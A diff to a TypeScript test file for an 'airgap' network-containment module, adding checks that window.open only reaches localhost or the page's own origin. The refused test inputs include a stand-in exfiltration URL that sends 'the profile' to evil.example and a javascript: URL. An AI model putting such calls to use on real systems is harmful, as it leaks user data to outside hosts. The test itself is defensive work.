@@ -4,8 +4,8 @@
 /**
  * Why does this file exist? It proves the gate (airgap.ts): loopbackOnly admits exactly http(s)/ws(s) to localhost,
  * 127.0.0.0/8 or [::1] with no credentials, and the two aliases narrow it by protocol; and installAirgap, on a fake
- * global, guards fetch (strings, URL objects, Request objects, relative URLs), WebSocket, EventSource, XMLHttpRequest
- * and importScripts, admits the page's own origin and page-made blob: and data: URLs, removes RTCPeerConnection,
+ * global, guards fetch (strings, URL objects, Request objects, relative URLs), WebSocket, EventSource, XMLHttpRequest,
+ * importScripts and window.open, admits the page's own origin and page-made blob: and data: URLs, removes RTCPeerConnection,
  * WebTransport and navigator.sendBeacon outright, refuses in one plain sentence, cannot be undone by a later script
  * (the properties are frozen, the originals unreachable through prototypes), and installs once.
  * What breaks if it is removed? The containment could be loosened, or made restorable, without a test going red.
@@ -99,6 +99,7 @@ function fakeGlobal(origin = 'http://localhost:4173') {
     fetch: async (input: unknown) => { sent.push(`fetch ${input instanceof Request ? input.url : String(input)}`); return new Response('ok') },
     WebSocket, EventSource, XMLHttpRequest, RTCPeerConnection, WebTransport, Request,
     importScripts: (...urls: string[]) => { sent.push(`import ${urls.join(' ')}`) },
+    open: (url?: string, target?: string) => { sent.push(`open ${url ?? '(none)'}${target ? ` ${target}` : ''}`); return null },
     navigator: new Navigator(),
     location: { origin, href: `${origin}/` },
   }
@@ -108,7 +109,7 @@ function fakeGlobal(origin = 'http://localhost:4173') {
 test('installAirgap: every primitive lets this machine, the page\'s own origin and page-made blob: or data: URLs through, and nothing else', async () => {
   const { g, sent, Request, WebSocket } = fakeGlobal()
   const r = installAirgap(g)
-  assert.deepEqual(r, { own: 'http://localhost:4173', guarded: ['fetch', 'WebSocket', 'EventSource', 'XMLHttpRequest', 'importScripts'], removed: ['RTCPeerConnection', 'WebTransport', 'navigator.sendBeacon'] })
+  assert.deepEqual(r, { own: 'http://localhost:4173', guarded: ['fetch', 'WebSocket', 'EventSource', 'XMLHttpRequest', 'importScripts', 'open'], removed: ['RTCPeerConnection', 'WebTransport', 'navigator.sendBeacon'] })
   const off = refusal('https://api.example.com/v1/messages')
   // fetch: a string, a URL object, a Request object, a relative URL (the page's own origin), blob: and data:.
   await g.fetch('http://localhost:11434/api/tags')
@@ -141,11 +142,20 @@ test('installAirgap: every primitive lets this machine, the page\'s own origin a
   // importScripts: every URL is checked, and nothing is loaded if one fails.
   g.importScripts('http://localhost:1/a.js', 'blob:http://localhost:4173/b')
   assert.throws(() => g.importScripts('http://localhost:1/a.js', 'https://cdn.example.com/x.js'), TypeError)
+  // window.open: a new tab is an address too; no URL (about:blank) passes as it is.
+  g.open('http://localhost:4173/manual.html', '_blank')
+  g.open()
+  g.open('about:blank')
+  g.open('/manual.html')
+  assert.throws(() => g.open('https://example.com/', '_blank'), (e: Error) => e instanceof TypeError && e.message === refusal('https://example.com/'))
+  assert.throws(() => g.open('https://evil.example/?leak=' + encodeURIComponent('the profile')), TypeError)
+  assert.throws(() => g.open('javascript:alert(1)'), TypeError, 'a javascript: URL is not an address either')
   assert.deepEqual(sent, [
     'fetch http://localhost:11434/api/tags', 'fetch ws://127.0.0.1:8787/x', 'fetch http://[::1]:8089/v1/messages', 'fetch http://localhost:4173/assets/x.json',
     'fetch blob:http://localhost:4173/0000', 'fetch data:text/plain,hi',
     'ws ws://localhost:8787/room', 'es http://127.0.0.1:1/events', 'xhr http://localhost:8080/v1/models',
     'import http://localhost:1/a.js blob:http://localhost:4173/b',
+    'open http://localhost:4173/manual.html _blank', 'open (none)', 'open about:blank', 'open http://localhost:4173/manual.html',
   ])
 })
 
@@ -171,7 +181,7 @@ test('installAirgap: a later script cannot restore a primitive, reach the origin
   assert.equal(airgapInstalled(g), true, 'what the host vouches to the Ring-0 action gate')
   assert.equal(airgapInstalled({}), false, 'another global is not vouched for by this one')
   const strict = (f: () => void): void => { assert.throws(f, TypeError) }
-  for (const name of ['fetch', 'WebSocket', 'EventSource', 'XMLHttpRequest', 'importScripts', 'RTCPeerConnection', 'WebTransport'] as const) {
+  for (const name of ['fetch', 'WebSocket', 'EventSource', 'XMLHttpRequest', 'importScripts', 'open', 'RTCPeerConnection', 'WebTransport'] as const) {
     const d = Object.getOwnPropertyDescriptor(g, name)
     assert.deepEqual([d?.writable, d?.configurable], [false, false], name)
     strict(() => { Object.defineProperty(g, name, { value: realFetch, configurable: true }) })
